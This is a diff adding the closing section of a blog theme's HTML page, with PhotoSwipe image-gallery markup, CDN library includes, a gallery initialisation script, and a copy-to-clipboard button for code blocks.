+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
